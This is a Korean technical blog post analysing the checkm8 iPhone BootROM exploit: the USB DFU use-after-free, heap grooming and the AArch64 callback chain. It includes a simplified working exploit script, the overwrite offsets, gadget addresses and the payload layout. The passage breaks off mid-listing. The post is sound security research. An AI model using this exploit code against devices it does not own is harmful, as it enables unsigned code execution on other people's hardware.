---
title: "checkm8 익스플로잇 기술 분석"
date: 2019-10-05
description: "Apple A5~A11 SoC의 BootROM 익스플로잇 checkm8에 대한 심층 분석: USB DFU 스택 Use-After-Free, 힙 그루밍, AArch64 셸코드 실행"
tags: ["checkm8", "iPhone", "AArch64", "iOS", "bootrom", "UAF", "jailbreak", "hardware-security"]
categories: ["Research"]
authors:
  - name: "ph4nt0m"
    link: "https://github.com/Phantomn"
    image: "https://github.com/Phantomn.png"
---

![checkm8 배너](/images/blog/checkm8-technical-analysis/Untitled.png)

checkm8 취약점은 iPhone X를 포함한 대부분의 iDevice의 BootROM에 존재하는 수정 불가능한 결함을 이용한다. 이 글에서는 해당 익스플로잇의 기술적 분석과 근본 원인을 살펴본다.

## 소개

익스플로잇을 들어가기 전에 iDevice의 부팅 과정과 BootROM(SecureROM이라고도 함)의 역할을 간단히 이해해두자.

부팅 체인은 다음과 같다:

![부팅 체인 다이어그램](/images/blog/checkm8-technical-analysis/Untitled-1.png)

장치가 켜지면 BootROM이 가장 먼저 실행된다. 주요 역할은 다음과 같다:

- 플랫폼 초기화 (필요한 플랫폼 레지스터 설정, CPU 초기화 등)
- 다음 부팅 단계를 검증하고 제어권 이전
  - BootROM은 IMG3/IMG4 이미지 파싱을 지원한다
  - BootROM은 이미지 복호화를 위해 GID 키에 접근할 수 있다
  - 이미지 검증을 위해 내장된 Apple 공개 키와 암호화 기능을 보유한다
- 추가 부팅이 불가능한 경우 DFU(Device Firmware Update)를 통해 장치를 복원

BootROM은 매우 소규모 코드로, iBoot의 경량 버전이라 할 수 있으며 대부분의 라이브러리 코드를 iBoot와 공유한다. iBoot와 달리 BootROM은 업데이트할 수 없다. 장치 제조 시 읽기 전용 메모리에 저장되며, Secure Boot 체인의 하드웨어 신뢰 루트(trust root)로서 동작한다.

BootROM 취약점은 공격자가 부팅 프로세스를 제어하고 장치에서 서명되지 않은 코드를 실행할 수 있게 한다.

![Secure Boot 체인](/images/blog/checkm8-technical-analysis/Untitled-2.png)

## checkm8의 역사

checkm8 익스플로잇은 2019년 9월 27일 저자 axi0mX에 의해 ipwndfu에 추가되었으며, 동시에 익스플로잇에 대한 설명과 추가 정보가 공개되었다.

USB 코드에서의 UAF 취약점은 iOS 12용 iBoot 베타를 패치하던 중 발견되었다. BootROM과 iBoot는 USB를 포함한 대부분의 코드를 공유하므로, 이 취약점은 BootROM에도 동일하게 존재한다.

익스플로잇 코드에서 볼 수 있듯이, 이 취약점은 DFU 모드에서 트리거된다. DFU는 USB를 통해 서명된 이미지를 장치로 전송해 나중에 부팅할 수 있게 하는 모드로, 업데이트 실패 후 장치를 복원하는 데 유용하다.

같은 날, 사용자 littlelailo가 3월에 이 취약점을 발견하고 [apollo.txt](https://gist.github.com/littlelailo/42c6a11d31877f98531f6d30444f59c4)에 설명을 게시했다고 밝혔다. 설명은 checkm8과 일치하지만 모든 익스플로잇 세부 사항이 명확하진 않다. 이 글에서는 BootROM에서 페이로드 실행에 이르기까지 익스플로잇의 모든 세부 사항을 설명한다.

분석은 위에서 언급한 리소스, 2018년 2월 유출된 iBoot/SecureROM 소스 코드, 그리고 테스트 장치(iPhone 7, CPID: 8010)에서 수행한 실험 데이터를 기반으로 한다. checkm8 자체를 이용해 얻은 SecureROM 및 SecureRAM 덤프도 분석에 도움을 주었다.

## USB에 대한 필수 지식

취약점이 USB 코드에 있으므로, 이 인터페이스가 어떻게 동작하는지 이해해야 한다. 여기서는 익스플로잇과 가장 관련 있는 핵심 내용만 다룬다.

USB 데이터 전송에는 다양한 타입이 있다. DFU에서는 **제어 전송(control transfer)** 모드만 사용된다.

이 모드에서 각 트랜잭션은 세 단계로 구성된다:

- **Setup Stage** — Setup 패킷이 전송된다. 다음 필드를 포함한다:
  - `bmRequestType` — 요청의 방향, 타입, 수신자(recipient)를 정의
  - `bRequest` — 요청 자체를 정의
  - `wValue`, `wIndex` — 요청에 따라 해석됨
  - `wLength` — Data Stage에서 전송되는 데이터 길이 지정
- **Data Stage** — 선택적 데이터 전송 단계. Setup 패킷에 따라 호스트→장치(OUT) 또는 장치→호스트(IN) 방향으로 데이터를 전송한다. 데이터는 작은 청크 단위로 전송된다(Apple DFU의 경우 0x40 바이트).
  - 호스트가 더 많은 데이터를 보내려면 OUT 토큰 후 데이터를 전송
  - 호스트가 장치로부터 데이터를 받을 준비가 되면 장치에 IN 토큰 전송
- **Status Stage** — 최종 단계로, 전체 트랜잭션 상태가 보고된다.
  - OUT 요청의 경우: 호스트가 IN 토큰을 보내고 장치는 길이 0 패킷으로 응답
  - IN 요청의 경우: 호스트가 OUT 토큰과 길이 0 패킷을 전송

아래 스키마는 OUT 및 IN 요청을 보여준다(ACK, NACK 등 핸드셰이크 패킷은 생략):

![USB 트랜잭션 스키마](/images/blog/checkm8-technical-analysis/Untitled-3.png)

## apollo.txt 분석

이 문서는 DFU 모드 알고리즘을 설명한다. 기본적으로 littlelailo가 분석한 모든 BootROM에는 다음과 같은 버그가 존재한다:

1. USB가 DFU를 통해 이미지를 가져오기 시작하면, DFU는 모든 명령을 처리하는 인터페이스를 등록하고 입출력 버퍼를 할당한다.
2. DFU로 데이터를 전송하면 Setup 패킷이 메인 코드에 의해 처리되고 인터페이스 코드가 호출된다.
3. 인터페이스 코드는 `wLength`가 입출력 버퍼 길이보다 짧은지 확인하고, 그 경우 인자로 전달된 포인터에 입출력 버퍼의 주소를 업데이트한다.
4. 그런 다음 수신하고자 하는 데이터 길이를 반환한다.
5. USB 메인 코드는 전역 변수를 해당 길이로 업데이트하고 데이터 패킷 수신을 준비한다.
6. 데이터 패킷이 수신되면 인자로 전달된 포인터를 통해 입출력 버퍼에 기록되고, 다른 전역 변수로 수신된 바이트 수를 추적한다.
7. 모든 데이터가 수신되면 DFU 특정 코드가 다시 호출되어 입출력 버퍼 내용을 이미지가 나중에 부팅될 메모리 위치로 복사한다.
8. USB 코드가 모든 변수를 초기화하고 다음 패킷을 처리한다.
9. DFU가 종료되면 출력 버퍼가 해제되고, 이미지 파싱에 실패하면 BootROM이 DFU를 다시 초기화한다.

이 단계들을 iBoot 소스 코드와 IDA에서 iPhone 7의 SecureROM을 리버싱한 결과와 비교해보자.

DFU 초기화 시 입출력 버퍼가 할당되고 DFU 요청 처리를 위한 USB 인터페이스가 등록된다:

```c
__int64 usb_dfu_init(){
    if(usb_dfu_inited & 1)
        return 0;
    io_buffer = memalign(0x800, 0x40); // IO-buffer 할당
    bzero(io_buffer, 0x800);

    unk_180088AD4[6] = [0,50,0,0,2,0];
    unk_180088AC0 = 0;
    byte_180088AC2[0] = 2;
    unk_180088AC8 = -1;

    // DFU 요청 처리를 위한 USB 인터페이스 등록
    sub_10000AED4((__int64)&unk_180088AF0, 1, 0);
    usb_dfu_interface_instance.field_0 = 1;
    usb_dfu_interface_instance.field_8 = (__int64)&dword_100018794;
    usb_dfu_interface_instance.field_10 = 1;
    usb_dfu_interface_instance.field_18 = (__int64)byte_10001879D;
    usb_dfu_interface_instance.field_70 = (__int64)byte_1000E2DC;

    usb_dfu_interface_instance.request_handler = (__int64)handle_interface_request;
    usb_dfu_interface_instance.data_received_handler = (__int64)data_received;
    usb_core_register_interface(&usb_dfu_interface_instance);
    usb_dfu_inited = 1;
    return 0;
}
```

DFU 요청에 대한 SETUP 패킷이 들어오면 해당 인터페이스 핸들러가 호출된다. OUT 요청(예: 이미지 전송)의 경우, 핸들러는 입출력 버퍼 주소와 수신할 데이터 길이를 반환해야 한다:

```c
// 인터페이스 제어 요청 핸들러 가져오기
request_handler = ep.registered_interfaces[(unsigned __int16)setup_request.wIndex]->request_handler;
if(!request_handler)
    goto LABEL_50;
// 인터페이스 제어 요청 핸들러 호출
// 전역 버퍼 포인터 설정
request_handler(&g_setup_request, &ep0_data_phase_buffer);
if( !(g_setup_request.bmRequestType & 0x80000000)){
    if(request_handler_ret >= 1){
        ep0_data_phase_length = request_handler_ret; // 전역 길이 설정
        ep0_data_phase_if_num = intf_num;
        goto LABEL_101;
    }
    if(!request_handler_ret){
        sub_10000DB0C();
        goto LABEL_101;
    }
LABEL_50:
    sub_10000CF3C();
    *_data_phase = 0;
    return;
LABEL_101:
    if(g_setup_request.bmRequestType & 0x80){
        if((g_setup_request.bmRequestType & 0x80) != 0x80)
            return
        need_data_phase = 1; // data phase 활성화
    }else{
        need_data_phase = *(unsigned __int64 *)&g_setup_request >> 48 != 0;
    }
    *_data_phase = need_data_phase;
}
```

DFU 인터페이스 핸들러는 요청을 확인하고, 유효하면 입출력 버퍼 주소(출력 파라미터 경유)와 예상 데이터 길이를 반환한다:

```c
excepted_length = (unsigned __int16)setup_request->wLength;
    if((DWORD)expected_length){
        if((unsigned int)excepted_length >= 0x801){
            dword_180088AD4 = 12815; // 0x320F
            word_180088AD8 = 2;
            byte_180088AC2[0] = 2;
            return -1;
        }
        *out_buffer = io_buffer; // 인자를 통해 버퍼 포인터 반환
    }else{
        dword_180088AD4 = 12800; // 0x3200
        word_180088AD8 = 6;
        byte_180088AC2[0] = 6;
    }
    dfu_excepted_length = excepted_length;
    return excepted_length;
}
```

Data Stage 동안 각 데이터 청크가 입출력 버퍼에 기록된 뒤, 버퍼 포인터와 수신 카운터가 업데이트된다. 모든 예상 데이터가 수신되면 인터페이스의 data-received 핸들러가 호출되고 전역 상태가 초기화된다:

```c
*data_phase = 0;
    if( !(is_setup & 1)){
        if(!data_rcvd)
            return;
        if(ep0_data_phase_rcvd + data_rcvd <= ep0_data_phase_length){
            if(ep0_data_phase_length - ep0_data_phase_rcvd >= data_rcvd)
                to_copy = data_rcvd;
            else
                to_copy = ep0_data_phase_length - ep0_data_phase_rcvd;
            memcpy(ep0_data_phase_buffer, ep0_rx_buffer, to_copy); // 수신 데이터를 IO-buffer에 복사
            ep0_data_phase_buffer += (unsigned int)to_copy; // 전역 버퍼 포인터 업데이트
            ep0_data_phase_rcvd += to_copy; // 수신 카운터 업데이트
            *data_phase = 1;
            // 예상 바이트 수신 완료 또는 0x40 바이트 미만 수신 시 전송 중지
            if(data_rcvd == 0x40)
                end_of_transfer = ep0_data_phase_rcvd == ep0_data_phase_length;
            else
                end_of_transfer = 1;
            if(!end_of_transfer)
                return;
            if(!(ep0_data_phase_if_num & 0x80000000) && ep0_data_phase_if_num < registered_interfaces_count){
                // 인터페이스 data received 핸들러 가져오기
                data_received_handler = ep.registered_interfaces[ep0_data_phase_if_num]->data_received_handler;
                if(data_received_handler){
                    data_received_handler(ep0_data_phase_rcvd);
                    usb_core_send_zlp();
                }
            }
        }else{
            sub_10000CF3C();
        }
        // 전역 상태 초기화
        ep0_data_phase_rcvd = 0;
        ep0_data_phase_length = 0;
        ep0_data_phase_buffer = 0;
        ep0_data_phase_if_num = -2;
        *data_phase = 0;
        return;
    }
}
```

DFU data 핸들러에서 수신된 데이터는 나중에 이미지가 로드될 메모리 영역(iBoot 소스 코드에서 `INSECURE_MEMORY`라 불리는 곳)으로 이동된다:

```c
*(QWORD *)&received = sub_10000AEE8(&unk_180088AF0);
    goto data_received;
}
*(QWORD *)&received = memcpy(*image_buffer[total_received], io_buffer, received); // IO-buffer 이미지 연결
dfu_excepted_length = 0;
dword_180088AD4 = 12800; // 0x3200
total_received += received;
```

장치가 DFU 모드를 종료하면 앞서 할당된 입출력 버퍼가 해제된다.

DFU 모드에서 이미지가 성공적으로 획득되면 검증 후 부팅된다. 오류가 발생하거나 이미지를 부팅할 수 없으면 DFU가 다시 초기화되어 전체 프로세스가 처음부터 반복된다.

**설명된 알고리즘에는 Use-After-Free 취약점이 존재한다.** 이미지 업로드를 위한 SETUP 패킷을 전송하고 Data Stage를 건너뛰어 트랜잭션을 완료하면, 다음 DFU 사이클에서 전역 상태가 초기화된 채로 유지되어 이전 DFU 이터레이션에서 할당된 입출력 버퍼 주소에 쓸 수 있게 된다. 이것이 바로 UAF다.

UAF 동작 방식을 이해했으므로, 이제 다음 DFU 이터레이션에서 무엇을 어떻게 덮어쓸 수 있는지가 문제다. DFU 재초기화 전에 이전 이터레이션의 모든 리소스가 해제되며, 새 이터레이션에서 메모리 할당이 정확히 동일하게 이루어져야 한다(힙 feng-shui).

결과적으로 UAF를 이용할 수 있게 해주는 또 다른 메모리 leak이 존재한다.

## checkm8 분석

이제 checkm8 자체를 살펴보자. 설명을 위해 iPhone 7을 대상으로 한 단순화된 버전의 익스플로잇을 사용한다. 플랫폼 특정 코드를 모두 제거하고, 기능에 영향을 주지 않는 범위에서 USB 요청의 순서와 타입을 변경했다. 페이로드 구성 코드도 제거했으며, 원본 `checkm8.py`에서 찾을 수 있다.

```python
#!/usr/bin/env python

from checkm8 import *

def main():
    print '*** checkm8 exploit by axi0mX ***'

    device = dfu.acquire_device(1800)
    start = time.time()
    print 'Found:', device.serial_number
    if 'PWND:[' in device.serial_number:
        print 'Device is already in pwned DFU Mode. Not executing exploit.'
        return

    payload, - = exploit_config(device.serial_number)
    t8010_nop_gadget = 0x10000CC6C
    callback_chain = 0x1800B0800
    t8010_overwrite = '\0' * 0x5c0
    t8010_overwrite += struct.pack('<32x2Q', t8010_nop_gadget, callback_chain)

    # heap massage
    stall(device)
    leak(device)
    for i in range(6):
        no_leak(device)
    dfu.usb_reset(device)
    dfu.release_device(device)

    # global state 설정 및 USB 재시작
    device = dfu.acquire_device()
    device.serial_number
    libusb1_async_ctrl_transfer(device, 0x21, 1, 0, 0, 'A' * 0x800, 0.0001)
    libusb1_no_error_ctrl_transfer(device, 0x21, 4, 0, 0, 0, 0)
    dfu.release_device(device)

    time.sleep(0.5)

    # heap 점령 / 스프레이
    device = dfu.acquire_device()
    device.serial_number
    stall(device)
    leak(device)
    leak(device)
    libusb1_no_error_ctrl_transfer(device, 0, 9, 0, 0, t8010_overwrite, 50)
    for i in range(0, len(payload), 0x800):
        libusb1_no_error_ctrl_transfer(device, 0x21, 1, 0, 0, payload[i:i+0x800], 50)

    dfu.usb_reset(device)
    dfu.release_device(device)

    device = dfu.acquire_device()
    if 'PWND:[checkm8]' not in device.serial_number:
        print 'ERROR : Exploit failed. Device did not enter pwned DFU Mode'
        sys.exit(1)
    print 'Device is now in pwned DFU Mode'
    print '(%0.2f seconds)'%(time.time() - start)
    dfu.release_device(device)

if __name__ == '__main__':
    main()
```

checkm8의 동작은 여러 단계로 구성된다:

1. 힙 Feng-shui
2. 전역 상태를 초기화하지 않고 입출력 버퍼 할당 및 해제
3. UAF를 통해 힙의 `usb_device_io_request` 덮어쓰기
4. 페이로드 배치
5. Callback 체인 실행
6. 셸코드 실행

### 1. 힙 Feng-shui

가장 흥미로운 단계로, 가장 상세하게 설명할 부분이다.

```python
stall(device)
leak(device)
for i in range(6):
    no_leak(device)
dfu.usb_reset(device)
dfu.release_device(device)
```

이 단계는 힙 UAF를 활용하기 좋은 방식으로 힙을 배치하는 것이 목적이다.

헬퍼 함수들은 다음과 같이 정의된다:

```python
def stall(device):
    libusb1_async_ctrl_transfer(device, 0x80, 6, 0x304, 0x40A, 'A'*0xC0, 0.00001)
def leak(device):
    libusb1_no_error_ctrl_transfer(device, 0x80, 6, 0x304, 0x40A, 0xC0, 1)
def no_leak(device):
    libusb1_no_error_ctrl_transfer(device, 0x80, 6, 0x304, 0x40A, 0xC1, 1)
```

`libusb1_no_error_ctrl_transfer`는 `device.ctrlTransfer`를 감싸는 래퍼로, 요청 실행 중 발생하는 모든 예외를 무시한다.

`libusb1_async_ctrl_transfer`는 비동기 요청 실행을 위한 libusb의 `libusb_submit_transfer` 래퍼다.

호출에 전달되는 파라미터:

- 장치 번호
- SETUP 패킷 데이터:
  - `bmRequestType`
  - `bRequest`
  - `wValue`
  - `wIndex`
- Data Stage 데이터 또는 데이터 길이 (`wLength`)
- 요청 타임아웃

세 가지 요청 타입 모두에서 공유되는 파라미터:

- `bmRequestType = 0x80`
  - `0b1XXXXXXX` — Data Stage 방향: 장치→호스트
  - `0bX00XXXXX` — 표준 요청 타입
  - `0bXXX00000` — 장치가 수신자
- `bRequest = 6` — GET_DESCRIPTOR
- `wValue = 0x304`
  - `wValueHigh = 0x3` — 디스크립터 타입: 문자열 (USB_DT_STRING)
  - `wValueLow = 0x4` — 문자열 디스크립터 인덱스 4 (장치 시리얼 번호)
- `wIndex = 0x40A` — 문자열 언어 식별자 (값은 익스플로잇과 무관)

요청 객체 구조 (0x30 바이트 할당):

![usb_device_io_request 구조](/images/blog/checkm8-technical-analysis/Untitled-4.png)

가장 관심 있는 필드는 `callback`과 `next`다:

- `callback` — 요청 완료 시 호출될 함수에 대한 포인터
- `next` — 같은 타입의 다음 객체에 대한 포인터; 요청 큐를 구성하는 데 사용

`stall`의 주요 기능은 최소 타임아웃으로 요청을 비동기적으로 실행하는 것이다. 운이 좋으면 OS 수준에서 요청이 취소되고 실행 큐에 남아 트랜잭션이 완료되지 않는다. 장치는 예약된 모든 SETUP 패킷을 계속 수신하고 필요 시 실행 큐에 배치한다.

Arduino USB 컨트롤러를 이용한 실험에서, 성공적인 익스플로잇을 위해 호스트가 SETUP 패킷과 IN 토큰을 전송한 뒤 타임아웃으로 트랜잭션을 취소해야 한다는 것을 확인했다.

이 미완성 트랜잭션의 모습:

![미완성 stall 트랜잭션](/images/blog/checkm8-technical-analysis/Untitled-5.png)

요청 길이는 딱 한 단위만 차이 난다. 표준 요청에는 다음과 같은 터미널 콜백이 있다:

```c
usb_device_io_request * standard_device_request_cb(usb_device_io_request * request){
    unsigned int io_length; // w8

    io_length = result->io_length;
    if(io_length && !(io_length & 0x3F) && (unsigned __int16)g_setup_request.wLength > io_length)
        result = (usb_device_io_request *)usb_core_send_zlp();
    return result;
}
```

`io_length` 값은 요청의 SETUP 패킷에서 `wLength`와 요청된 디스크립터의 원본 길이 중 최솟값이다. 디스크립터가 상당히 길기 때문에 그 길이 범위 내에서 `io_length`를 제어할 수 있다.

`g_setup_request.wLength` 값은 가장 최근 SETUP 패킷의 `wLength`와 같으며, 이 경우 `0xC1`이다.

따라서 `stall` 또는 `leak` 형태의 요청이 완료되면 터미널 콜백 함수의 조건이 충족되고 `usb_core_send_zlp()`가 호출된다. 이 호출은 길이 0 패킷 요청을 생성해 실행 큐에 추가한다.

이는 Status Stage에서 트랜잭션을 올바르게 완료하는 데 필요하다.

`usb_core_complete_endpoint_io` 함수가 요청을 완료한다: 먼저 콜백을 호출하고, 그 다음 요청 메모리를 해제한다. 요청은 전체 트랜잭션 완료 시뿐만 아니라 USB 리셋 시에도 완료된다.

리셋 신호가 수신되면 실행 큐의 모든 요청이 완료된다.

정리 루프를 통해 나중에 요청을 해제할 때, `usb_core_send_zlp()`를 선택적으로 호출하여 UAF에 필요한 충분한 힙 제어권을 얻을 수 있다. 정리 루프는 다음과 같다:

```c
aborted_list = ep->io_head;
ep->io_head = 0;
ep->io_tail = 0;
exit_critical_section();
while(aborted_list){
    v16 = aborted_list->next;
    aborted_list->status = 1;
    usb_core_complete_endpoint_io(aborted_list);
    aborted_list = v16;
}
```

큐가 비워지면 취소된 요청들이 `usb_core_complete_endpoint_io`에 의해 실행 및 완료된다. `usb_core_send_zlp`로 할당된 요청은 `ep->io_head`에 배치된다.

USB 리셋이 완료되면 `io_head`/`io_tail` 포인터를 포함한 모든 엔드포인트 정보가 초기화되며, 길이 0 요청이 힙에 남게 된다. 이를 통해 힙에 작은 청크들을 생성할 수 있다.

아래 스키마는 이 방법을 보여준다:

![힙 조작 스키마](/images/blog/checkm8-technical-analysis/Untitled-6.png)

SecureROM 힙에서 가장 작은 적절한 빈 청크에서 새 메모리 영역이 할당된다. 위에서 설명한 방법으로 작은 빈 청크들을 생성하면, `io_buffer` 및 요청 할당을 포함한 USB 초기화 중 메모리 할당을 제어할 수 있다.

이를 더 잘 이해하기 위해 DFU 초기화 시 힙에 어떤 할당이 이루어지는지 살펴보자. iBoot 소스 코드 분석과 SecureROM 리버싱을 통해 다음 순서를 파악했다:

1. 문자열 디스크립터 할당:
   - 1.1 Nonce (size 234)
   - 1.2 Manufacturer (22)
   - 1.3 Product (62)
   - 1.4 Serial Number (198)
   - 1.5 Configuration string (62)

2. USB 컨트롤러 태스크 생성 관련 할당:
   - 2.1 Task structure (0x3c0)
   - 2.2 Task stack (0x1000)

3. `io_buffer` (0x800)

4. Configuration descriptors:
   - 4.1 High-Speed (25)
   - 4.2 Full-Speed (25)

그런 다음 request 구조체가 할당된다. 힙에 작은 청크들이 있으면 첫 번째 카테고리의 일부 할당이 이동하고, 이후 모든 할당도 함께 이동한다. 이를 통해 이전 버퍼를 참조하여 `usb_device_io_request`로 오버플로할 수 있다.

결과는 다음과 같다:

![그루밍 후 힙 레이아웃](/images/blog/checkm8-technical-analysis/Untitled-7.png)

필요한 오프셋을 계산하기 위해 위에 나열된 모든 할당을 iBoot 힙 소스 코드를 약간 수정한 버전으로 에뮬레이션했다:

```c
#include "heap.h"
#include <stdio.h>
#include <unistd.h>
#include <sys/mman.h>

#ifndef NOLEAK
#define NOLEAK (8)
#endif

int main() {
    void * chunk = mmap((void *)0x1004000, 0x100000, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
    printf("chunk = %p\n", chunk);
    heap_add_chunk(chunk, 0x100000, 1);
    malloc(0x3c0); // SecureRAM에서 주소 하위 바이트 정렬

    void * descs[10];
    void * io_req[100];
    descs[0] = malloc(234); // Nonce
    descs[1] = malloc(22);  // Manufacturer
    descs[2] = malloc(62);  // Product
    descs[3] = malloc(198); // Serial Number
    descs[4] = malloc(62);  // Configuration string

    const int N = NOLEAK; // 8

    void * task = malloc(0x3c0);    // Task Structure
    void * task_stack = malloc(0x4000); // Task Stack

    void * io_buf_0 = memalign(0x800, 0x40); // io_buffer
    void * hs = malloc(25); // High-Speed 설정 디스크립터
    void * fs = malloc(25); // Full-Speed 설정 디스크립터

    void * zlps[2];

    for(int i = 0; i < N; i++) // io_queue 할당
    {
        io_req[i] = malloc(0x30);
    }

    for(int i = 0; i < N; i++) // 2개 제외하고 모두 해제
    {
        if(i < 2)
        {
            zlps[i] = malloc(0x30);
        }
        free(io_req[i]);
    }

    // ... (두 번째 라운드 할당)

    printf("io_req_off = %#lx\n", (int64_t)io_req[0] - (int64_t)io_buf_0);
    printf("hs_off  = %#lx\n", (int64_t)hs - (int64_t)io_buf_0);
    printf("fs_off  = %#lx\n", (int64_t)fs - (int64_t)io_buf_0);

    return 0;
}
```

출력:

```
chunk = 0x1004000
...
io_req_off = 0x5c0
hs_off  = 0x4c0
fs_off  = 0x540
```

보다시피 또 다른 `usb_device_io_request`가 이전 버퍼 시작 위치에서 `0x5c0` 오프셋에 나타난다.

이는 익스플로잇 코드에 직접 대응된다:

```python
t8010_overwrite = '\0' * 0x5c0
t8010_overwrite += struct.pack('<32x2Q', t8010_nop_gadget, callback_chain)
```

checkm8과 함께 제공되는 SecureRAM 힙의 현재 상태를 분석하여 이 결론들을 검증할 수 있다. 힙 덤프를 파싱하고 청크를 열거하는 간단한 스크립트를 작성했다. `usb_device_io_request` 오버플로 과정에서 일부 메타데이터가 손상되므로 해당 청크는 건너뛴다.

```python
#!/usr/bin/env python3

import struct
from hexdump import hexdump

with open('HEAP', 'rb') as f:
    heap = f.read()

cur = 0x4000

def parse_header(cur):
    _, _, _, _, this_size, t = struct.unpack('<QQQQQQ', heap[cur:cur + 0x30])
    is_free = t & 1
    prev_free = (t >> 1) & 1
    prev_size = t >> 2
    this_size *= 0x40
    prev_size *= 0x40
    return this_size, is_free, prev_size, prev_free

while True:
    try:
        this_size, is_free, prev_size, prev_free = parse_header(cur)
    except Exception as ex:
        break
    print('chunk at', hex(cur + 0x40))
    if this_size == 0:
        if cur in (0x9180, 0x9200, 0x9280):  # 손상된 청크 건너뜀
            this_size = 0x80
        else:
            break
    print(hex(this_size), 'free' if is_free else 'non-free', hex(prev_size), prev_free)
    hexdump(heap[cur + 0x40:cur + min(this_size, 0x100)])
    cur += this_size
```

출력의 하위 바이트가 에뮬레이션 결과와 일치한다.

`io_buffer` 바로 뒤에 있는 High-Speed/Full-Speed 설정 디스크립터로 오버플로하는 것도 가능하다. 설정 디스크립터의 한 필드가 전체 길이를 담당하는데, 이를 오버플로하면 디스크립터 너머까지 읽을 수 있다. 익스플로잇을 수정해 직접 실험해볼 수 있다.

### 2. 전역 상태를 초기화하지 않고 io_buffer 할당 및 해제

```python
device = dfu.acquire_device()
device.serial_number
libusb1_async_ctrl_transfer(device, 0x21, 1, 0, 0, 'A' * 0x800, 0.0001)
libusb1_no_error_ctrl_transfer(device, 0x21, 4, 0, 0, 0, 0)
dfu.release_device(device)
```

이 단계에서 이미지 업로드를 위한 미완성 OUT 요청이 생성된다.

동시에 전역 상태가 초기화되고 힙의 버퍼 주소가 `io_buffer`에 기록된다. DFU는 `DFU_CLR_STATUS` 요청으로 리셋되고 새 DFU 이터레이션이 시작된다.

### 3. UAF를 통해 힙의 usb_device_io_request 덮어쓰기

```python
device = dfu.acquire_device()
device.serial_number
stall(device)
leak(device)
leak(device)
libusb1_no_error_ctrl_transfer(device, 0, 9, 0, 0, t8010_overwrite, 50)
```

이 단계에서 `usb_device_io_request` 객체가 힙에 할당되고 `t8010_overwrite`로 오버플로된다.

이 덮어쓰기 내용은 첫 번째 단계에서 정의했다.

`t8010_nop_gadget`과 `0x1800B0800`은 `usb_device_io_request` 구조체의 `callback`과 `next` 필드를 오버플로해야 하는 값이다.

`t8010_nop_gadget`은 아래와 같다. 이름과 달리 단순 반환 외에 이전 LR 레지스터를 복원하고, `usb_core_complete_endpoint_io`의 콜백 이후 `free` 호출을 건너뛴다. 오버플로로 힙 메타데이터가 손상되어 `free` 시도가 익스플로잇에 영향을 미치기 때문에 중요하다:

```
bootrom:000000010000CC6C LDP X29, X30, [SP,#0x10+var_s0]  // fp, lr 복원
bootrom:000000010000CC70 LDP X20, X19, [SP+0x10+var_10],#0x20
bootrom:000000010000CC74 RET
```

`next`는 `INSECURE_MEMORY + 0x800`을 가리킨다. INSECURE_MEMORY는 나중에 익스플로잇 페이로드를 저장하며, 페이로드 오프셋 `0x800`에 callback 체인이 위치한다.

### 4. 페이로드 배치

```python
for i in range(0, len(payload), 0x800):
    libusb1_no_error_ctrl_transfer(device, 0x21, 1, 0, 0, payload[i:i+0x800], 50)
```

모든 후속 패킷이 이미지에 할당된 메모리 영역에 배치된다. 페이로드 레이아웃:

```
0x1800B0000: t8010_shellcode              # 초기화 셸코드
...
0x1800B0180: t8010_handler               # 새 USB 요청 핸들러
...
0x1800B0400: 0x1000006a5                 # 가짜 translation table 디스크립터
                                         # SecureROM: 0x100000000 -> 0x100000000
                                         # 원본 translation table의 값과 일치
...
0x1800B0600: 0x60000180000625            # 가짜 translation table 디스크립터
                                         # SecureRAM: 0x180000000 -> 0x180000000
                                         # 원본 translation table의 값과 일치
0x1800B0608: 0x1800006a5                 # 가짜 translation table 디스크립터
                                         # 새 값: 0x182000000 -> 0x180000000
                                         # 코드 실행 권한 포함
0x1800B0610: disable_wxn_arm64           # WXN 비활성화 코드
0x1800B0800: usb_rop_callbacks           # callback 체인
```

### 5. Callback 체인 실행

```python
dfu.usb_reset(device)
dfu.release_device(device)
```

USB 리셋 후 링크드 리스트를 통해 큐에 있는 미완성 `usb_device_io_request` 항목들을 취소하는 루프가 시작된다. 이전 단계에서 나머지 큐를 교체해 callback 체인을 제어할 수 있게 되었다. 이 체인을 구성하기 위해 다음 가젯을 사용한다:

```
bootrom:000000010000CC4C LDP X8, X10, [X0,#0x70] ; X0 - usb_device_io_request 포인터; X8 = arg0, X10 = 호출 주소
bootrom:000000010000CC50 LSL W2, W2, W9
bootrom:000000010000CC54 MOV X0, X8 ; arg0
bootrom:000000010000CC58 BLR X10   ; 호출
bootrom:000000010000CC5C CMP W0, #0
bootrom:000000010000CC60 CSEL W0, W0, W19, LT
bootrom:000000010000CC64 B   loc_10000CC6C
```

보다시피 호출 주소와 첫 번째 인자가 request 구조체의 `0x70` 오프셋에서 로드된다. 이 가젯으로 임의의 `f(x)` 형태 호출을 쉽게 실행할 수 있다.

전체 호출 체인을 Unicorn Engine으로 에뮬레이션할 수 있다 (uEmu 플러그인의 수정 버전을 사용했다):

![Callback 체인 에뮬레이션](/images/blog/checkm8-technical-analysis/Untitled-8.png)

iPhone 7의 전체 체인:

#### 5.1. dc_civac 0x1800B0600

```
000000010000046C: SYS #3, c7, c14, #1, X0
0000000100000470: RET
```

가상 주소에서 프로세서 캐시를 정리하고 무효화한다. 이후 프로세서 주소가 페이로드를 가리키도록 만든다.

#### 5.2. dmb

```
0000000100000478: DMB SY
000000010000047C: RET
```

이 명령어 이전의 모든 메모리 작업이 완료되도록 보장하는 메모리 배리어다. 고성능 프로세서는 최적화를 위해 명령어를 비순서 실행할 수 있는데, 이를 방지한다.

#### 5.3. enter_critical_section()

이후 작업의 원자적 실행을 위해 인터럽트가 마스킹된다.

#### 5.4. write_ttbr0(0x1800B0000)

```
00000001000003E4: MSR #0, c2, c0, #0, X0; [>] TTBR0_EL1
00000001000003E8: ISB
00000001000003EC: RET
```

TTBR0_EL1을 `0x1800B0000`으로 설정한다 — 익스플로잇 페이로드가 저장된 INSECURE_MEMORY 주소다. Translation 디스크립터는 페이로드의 특정 오프셋에 위치한다:

```
0x1800B0400: 0x1000006a5       0x100000000 -> 0x100000000 (rx)
...
0x1800B0600: 0x60000180000625  0x180000000 -> 0x180000000 (rw)
0x1800B0608: 0x1800006a5       0x182000000 -> 0x180000000 (rx)
```

#### 5.5. tlbi

```
0000000100000434: DSB SY
0000000100000438: SYS #0, c8, c7, #0
000000010000043C: DSB SY
0000000100000440: ISB
0000000100000444: RET
```

새 translation table에 따라 주소를 변환하도록 translation table이 무효화된다.

#### 5.6. 0x1820B0610 — disable_wxn_arm64

```
MOV  X1, #0x180000000
